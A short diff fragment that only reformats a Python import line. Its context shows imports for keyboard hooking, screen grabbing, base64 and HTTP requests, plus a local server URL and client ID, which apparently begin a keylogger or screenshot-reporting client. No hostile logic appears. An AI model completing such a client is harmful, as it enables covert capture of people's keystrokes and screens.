@@ -1,4 +1,4 @@
-import requests,keyboard,time,os,base64,uuid,socket
+import requests, keyboard, time, os, base64, uuid, socket
 from PIL import ImageGrab
 u='http://localhost:8000'
 i=str(uuid.uuid4())
